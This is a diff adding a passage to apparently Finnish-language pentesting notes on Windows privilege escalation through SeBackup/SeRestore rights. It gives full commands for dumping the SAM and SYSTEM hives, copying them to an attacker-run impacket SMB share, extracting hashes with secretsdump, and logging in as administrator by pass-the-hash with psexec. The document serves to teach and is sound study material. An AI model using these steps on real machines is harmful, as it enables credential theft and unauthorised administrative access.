@@ -140,4 +140,34 @@ whoami /priv
 ```
 Lista vaarallisista privilegeistä: https://github.com/gtworek/Priv2Admin
 
-SeBackup / SeRestore
+**SeBackup / SeRestore
+
+Jos käyttäjällä SeBackup / SeRestore oikeudet, voidaan esim. kopioida SAM ja SYSTEM rekisteritiedot ja saada Administratorin salasana-hash käyttöön. Command promt auki Run as administrator -> 
+```cmd
+reg save hklm\system C:\polku\system.hive
+```
+```cmd
+reg save hklm\sam C:\polku\sam.hive
+```
+Tiedostot voidaan siirtää hyökkääjän koneelle esim. käynnistämällä hyökkääjän koneelle pieni SMB-palvelin ja kopioimalla tiedostot sinne. Esim. ohjataan public -niminen kansio ja ohjataan se hyökkääjän koneella share-kansioon, ja käyttäjätunnus+salasana korkatulta Windows-käyttäjältä:
+```cmd
+mkdir share
+```
+```cmd
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username KÄYTTÄJÄ -password SALASANA public share
+```
+Uhrin koneella kopiointi:
+```cmd
+copy C:\polku\sam.hive \\HYÖKKÄÄJÄN_IP\public\
+```
+```cmd
+copy C:\polku\system.hive \\HYÖKKÄÄJÄN_IP\public\
+```
+Tiedostoista hashit:
+```cmd
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```cmd
+Ja kirjautuminen hasheja käyttämällä:
+```cmd
+python3.9 /opt/impacket/examples/psexec.py -hashes q1w2e3r4t5y6u7iu:9o8i7u6y5t4r3e2w12q administrator@UHRIN_IP
+```
